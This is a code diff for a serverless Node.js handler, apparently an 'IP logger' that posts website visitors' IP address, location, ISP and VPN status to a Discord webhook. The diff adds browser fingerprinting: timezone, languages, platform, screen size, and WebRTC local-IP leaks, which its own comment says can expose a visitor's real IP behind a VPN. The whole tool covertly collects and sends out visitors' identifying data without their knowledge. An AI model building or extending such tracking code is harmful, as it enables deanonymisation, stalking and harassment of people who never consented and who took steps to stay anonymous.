@@ -47,6 +47,15 @@ module.exports = async (req, res) => {
       return res.status(200).json({ success: true, message: 'Bot ignored' });
     }
 
+    // Parse fingerprinting data from request body
+    const fingerprint = req.body || {};
+    const timezone = fingerprint.timezone || 'Unknown';
+    const languages = fingerprint.languages ? fingerprint.languages.join(', ') : 'Unknown';
+    const webrtcIPs = fingerprint.webrtcIPs || [];
+    const platform = fingerprint.platform || 'Unknown';
+    const deviceInfo = fingerprint.screen ? 
+      `${fingerprint.screen.width}x${fingerprint.screen.height}` : 'Unknown';
+
     // Discord webhook URL from environment variable
     const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
 
@@ -117,56 +126,86 @@ module.exports = async (req, res) => {
       vpnStatus = '⚠️ Check Failed';
     }
 
-    // Create Discord embed message
+    // Create Discord embed message with enhanced fingerprinting
+    const fields = [
+      {
+        name: '📍 IP Address',
+        value: `\`${ip}\``,
+        inline: true
+      },
+      {
+        name: '🔒 VPN Status',
+        value: vpnStatus,
+        inline: true
+      },
+      {
+        name: '📡 Connection Type',
+        value: connectionType,
+        inline: true
+      },
+      {
+        name: '🌍 Location',
+        value: `\`${locationInfo}\``,
+        inline: false
+      },
+      {
+        name: '🏢 ISP/Provider',
+        value: `\`${ispInfo}\``,
+        inline: false
+      }
+    ];
+
+    // Add WebRTC IPs if detected (can reveal real IP behind VPN)
+    if (webrtcIPs.length > 0) {
+      fields.push({
+        name: '🔓 WebRTC Leak (Local IPs)',
+        value: `\`${webrtcIPs.join(', ')}\``,
+        inline: false
+      });
+    }
+
+    // Add timezone and language info
+    fields.push(
+      {
+        name: '⏰ Timezone',
+        value: `\`${timezone}\``,
+        inline: true
+      },
+      {
+        name: '🌐 Languages',
+        value: `\`${languages.substring(0, 50)}\``,
+        inline: true
+      },
+      {
+        name: '💻 Device Info',
+        value: `\`${platform} | ${deviceInfo}\``,
+        inline: true
+      },
+      {
+        name: '🕐 Timestamp',
+        value: `\`${timestamp}\``,
+        inline: true
+      },
+      {
+        name: '🖥️ User Agent',
+        value: `\`\`\`${userAgent.substring(0, 100)}\`\`\``,
+        inline: false
+      },
+      {
+        name: '🔗 Referrer',
+        value: `\`${referer}\``,
+        inline: false
+      }
+    );
+
     const discordMessage = {
       embeds: [{
         title: '🌐 New Visitor Logged',
         color: vpnColor,
-        fields: [
-          {
-            name: '📍 IP Address',
-            value: `\`${ip}\``,
-            inline: true
-          },
-          {
-            name: '🔒 VPN Status',
-            value: vpnStatus,
-            inline: true
-          },
-          {
-            name: '📡 Connection Type',
-            value: connectionType,
-            inline: true
-          },
-          {
-            name: '🌍 Location',
-            value: `\`${locationInfo}\``,
-            inline: false
-          },
-          {
-            name: '🏢 ISP/Provider',
-            value: `\`${ispInfo}\``,
-            inline: false
-          },
-          {
-            name: '🕐 Timestamp',
-            value: `\`${timestamp}\``,
-            inline: true
-          },
-          {
-            name: '🖥️ User Agent',
-            value: `\`\`\`${userAgent.substring(0, 100)}\`\`\``,
-            inline: false
-          },
-          {
-            name: '🔗 Referrer',
-            value: `\`${referer}\``,
-            inline: false
-          }
-        ],
+        fields: fields,
         timestamp: timestamp,
         footer: {
-          text: 'IP Logger with VPN Detection'
+          text: 'IP Logger with Advanced Fingerprinting'
         }
       }]
     };
